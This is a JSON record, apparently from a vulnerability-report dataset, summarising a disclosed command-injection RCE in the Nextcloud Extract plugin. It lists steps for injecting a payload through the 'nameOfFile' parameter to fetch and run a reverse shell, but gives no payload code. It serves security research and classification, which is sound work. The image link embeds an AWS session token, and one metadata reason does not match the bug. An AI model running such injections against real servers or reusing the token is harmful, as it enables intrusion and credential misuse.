    "image_6": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/362/a07e9858f5a275585787b9fc4feb785c16337f6b/Screen_Shot_2019-04-23_at_5.55.31_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.55.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.55.31_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c59dfeb4b0b44bd491c614ab5941e2ce7ce929111df3159480e336daaff10a24"
  },
  "disclosed_date": 1559215020,
  "report_url": "https://hackerone.com/reports/546753",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Install the Extract plugin from the Nextcloud Apps menu."
    ],
    [
      2,
      "Upload a RAR file and use the 'Extract Here' functionality while intercepting the request with a tool like BurpSuite."
    ],
    [
      3,
      "Modify the 'nameOfFile' parameter in the intercepted request to include a command injection payload."
    ],
    [
      4,
      "Execute the payload to download and run a reverse shell script on the server."
    ]
  ],
  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) in the Nextcloud Extract plugin due to improper sanitization of user input in the 'unrar' command execution. An attacker can inject arbitrary commands via the 'nameOfFile' parameter, leading to full system compromise.",
  "reason": "The attack involves multiple steps including intercepting and modifying HTTP requests, crafting command injection payloads, and setting up a reverse shell. However, the vulnerability itself is straightforward once the command injection vector is identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via manipulated parameters in an HTTP request, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on detecting command injection vulnerabilities.",
    "is_detectable": false
  }
}